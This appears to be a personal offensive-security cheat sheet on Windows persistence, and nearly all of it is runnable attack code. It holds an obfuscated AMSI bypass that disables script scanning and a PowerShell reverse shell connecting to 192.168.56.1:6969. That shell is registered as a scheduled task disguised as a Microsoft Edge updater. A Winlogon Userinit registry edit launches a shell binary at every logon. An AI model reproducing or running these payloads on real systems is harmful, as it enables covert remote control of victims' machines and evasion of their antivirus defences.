# Persistance on windows

### Bypass AMSI (desactivate)

```ps1
$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true);
```

### Register tasks


-User could be:
* system
* "NT AUTHORITY\Interactive"

-TaskPath Could be '\Microsoft\Windows\DriverX', but in the end, it is more visible

```batch
schtasks /CREATE /SC MINUTE /TN "Reverse Shell" /TR "C:\Users\s12de\Downloads\shell.exe"
```


```ps1
$command = '
&{
$client = New-Object System.Net.Sockets.TCPClient(\"192.168.56.1\",6969);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex \". { $data } 2>&1\" | Out-String );
  $sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()
}
'

# Register command
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonInteractive -NoLogo -NoProfile -ExecutionPolicy Bypass -Command $command";
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5) -RepetitionInterval (New-TimeSpan -Minutes 1);
$settings = New-ScheduledTaskSettingsSet;
Register-ScheduledTask -TaskName 'MicrosoftEdgeUpdateTaskUserCore' -Description 'Keeps your Microsoft software up to date' -Settings $settings -Trigger $trigger -Action $action
```


```ps1
# Get
Get-ScheduledTask

# Debug command
$command = "&{echo toto > C:\Users\User\Desktop\toto.txt}"
powershell -Command "&{echo toto > C:\Users\User\Desktop\toto.txt}"
```

### Run registry key

```ps1
# Get
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit

# Set
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, C:\Users\s12de\Downloads\shell.exe" /f
```

# Link

* List of 10: https://www.sciencedirect.com/science/article/pii/S1742287619300362
* https://medium.com/@s12deff/winlogon-windows-reverse-shell-persistence-60ab10a31c4
